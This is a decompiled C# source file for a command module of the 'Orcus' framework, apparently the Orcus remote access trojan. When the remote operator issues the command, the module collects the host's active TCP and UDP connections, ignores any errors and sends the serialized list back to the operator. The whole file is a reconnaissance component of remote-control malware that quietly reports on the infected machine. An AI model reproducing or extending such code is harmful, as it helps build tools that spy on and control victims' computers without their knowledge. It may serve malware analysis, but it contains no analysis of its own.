using System;
using System.Collections.Generic;
using Orcus.Plugins;
using Orcus.Shared.Commands.ActiveConnections;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ActiveConnections;

internal class ActiveConnectionsCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		List<ActiveConnection> list = new List<ActiveConnection>();
		try
		{
			list.AddRange(Connections.GetTcpConnections());
		}
		catch (Exception)
		{
		}
		try
		{
			list.AddRange(Connections.GetUdpConnections());
		}
		catch (Exception)
		{
		}
		Serializer val = new Serializer(typeof(List<ActiveConnection>));
		connectionInfo.CommandResponse((Command)(object)this, val.Serialize((object)list), (PackageCompression)0);
	}

	protected override uint GetId()
	{
		return 0u;
	}
}
